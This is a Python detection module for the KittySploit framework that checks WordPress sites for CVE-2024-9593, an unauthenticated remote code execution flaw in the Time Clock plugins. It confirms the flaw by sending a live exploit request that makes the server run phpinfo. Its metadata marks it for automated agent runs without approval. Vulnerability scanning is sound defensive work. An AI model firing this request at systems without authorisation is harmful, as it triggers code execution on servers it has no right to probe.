#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Time Clock plugin and Time Clock Pro plugin for WordPress are vulnerable to Remote Code Execution in versi."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Remote Code Execution Detection',
        'description': "The Time Clock plugin and Time Clock Pro plugin for WordPress are vulnerable to Remote Code Execution in versions up to, and including, 1.2.2 (for Time Clock) and 1.1.4 (for Time Clock Pro) via the 'etimeclockwp_load_function_callback' function. This allows unauthenticated attackers to execute code on the server. The invoked function's parameters cannot be specified.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'time-clock', 'wp', 'wordpress', 'wp-plugin', 'rce', 'time-clock-pro', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/detail/time-clock-122-unauthenticated-limited-remote-code-execution',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-9593',
            'https://github.com/RandomRobbieBF/CVE-2024-9593',
        ],
        'cve': 'CVE-2024-9593',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/time-clock',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-admin/admin-ajax.php?action=etimeclockwp_load_function'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='function=phpinfo\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PHP Extension', 'PHP Version',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Remote Code Execution detected', path=path)
            return True
        return False

